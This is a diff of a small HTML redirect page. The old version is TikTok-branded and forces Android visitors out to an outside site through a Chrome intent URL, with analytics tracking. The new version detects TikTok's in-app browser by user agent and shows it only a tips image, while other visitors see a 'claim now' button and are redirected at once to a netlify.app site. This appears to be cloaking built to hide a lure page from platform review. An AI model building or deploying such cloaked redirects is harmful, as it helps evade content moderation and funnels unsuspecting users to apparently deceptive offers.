@@ -1,89 +1,57 @@
-
 <!DOCTYPE html>
 <html lang="en">
-      <link rel="icon" href="https://sf-tb-sg.ibytedtos.com/obj/eden-sg/uhtyvueh7nulogpoguhm/tiktok-icon2.png" type="image/x-icon">
-
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
 <head>
-  <!-- Replace 'https://www.example.com' with the desired URL -->
-
-<script type="text/javascript">cookieChoices = {};</script>
-
-<script>
-function openLinkBasedOnDevice(url) {
-  var userAgent = navigator.userAgent;
-
-  if (/(android)/i.test(userAgent)) {
-    // If the device is Android, open the link in Chrome
-    window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) + '#Intent;scheme=http;package=com.android.chrome;end;';
-  } else if (/(iphone|ipad|ipod)/i.test(userAgent)) {
-    // If the device is iOS, open the link in Safari
-    window.location.href = url;
-  } else {
-    // For other devices, open the link in the default browser
-    window.location.href = url
-  }
-}
-
-// Automatically execute the function after a 5-second delay
-setTimeout(function() {
-  var url = 'https://2627.us/';
-  openLinkBasedOnDevice(url);
- }, 200); // 500 milliseconds = 5 seconds
-</script>
-
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-        }
-
-        #tiktok-logo {
-            width: 250px;
-            margin-bottom: 20px;
-        }
-
-        #redirect-text {
-            font-size: 30px;
-            color: #333;
-            opacity: 0;
-            animation: fadeIn 2s ease-in-out forwards, scaleUp 2s ease-in-out infinite alternate;
-        }
-
-        @keyframes fadeIn {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-
-        @keyframes scaleUp {
-            0% { transform: scale(1); }
-            100% { transform: scale(1.2); }
-        }
-      #openLink {
-        margin: 50px;
-        text-align: center;
-     
-      }
-    </style>
-  
-  <script type="text/javascript">
-    (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "m91v8xxbg4");
-</script>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <style>
+    * {
+      padding: 0;
+      margin: 0;
+    }
+    .link {
+      padding: 10px 50px;
+      display: inline-block;
+      margin-top: 20px;
+      background: linear-gradient(90deg, #90FFFF 0%, #00FFEB 100%);
+      color: #2F3033;
+      text-decoration: none;
+      border-radius: 54px;
+    }
+  </style>
 </head>
 <body>
-    <img id="tiktok-logo" src="https://i.ibb.co/JB4WstC/tiktok-browser.gif" alt="TikTok Logo">
+  <div id="downloadBox" style="display: none; text-align: center; margin-top: 30vh;">
+    <!--<div><img alt="logo" src="../static-web.hzmk.site/as/common-static/funkie-tips/logo2ae0.png?v=20230717" style="width:100px"/></div>-->
+    <div><a id="link" target="_blank" class="link">claim now</a></div>
+  </div>
+  <img alt="tips" id="tips" width="100%" src="../static-web.hzmk.site/as/common-static/funkie-tips/tips22ae0.png?v=20230717" style="display: none;"/>
+  <script>
+    function getQueryString(name) {
+        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) {
+            return unescape(r[2]);
+        }
+        return null;
+    }
+    var onelinkDomain = 'https://smartsweets.netlify.app';
+    var isdebug = getQueryString('debug');
+    var ua = navigator.userAgent.toLowerCase();
+    var isTikTok = ua.indexOf('tiktok') > -1 || ua.indexOf('musical') > -1 || ua.indexOf('bytedance') > -1;
+    var tipsDom = document.getElementById('tips');
+    var downloadBoxDom = document.getElementById('downloadBox');
+    var linkDom = document.getElementById('link');
+    isdebug && alert(ua);
+    if (!isTikTok) {
+      downloadBoxDom.style.display = 'block';
+      linkDom.href = onelinkDomain;
+      window.location.replace(onelinkDomain);
+    } else {
+      tipsDom.style.display = 'block';
+    }
+  </script>
 </body>
-  
 </html>
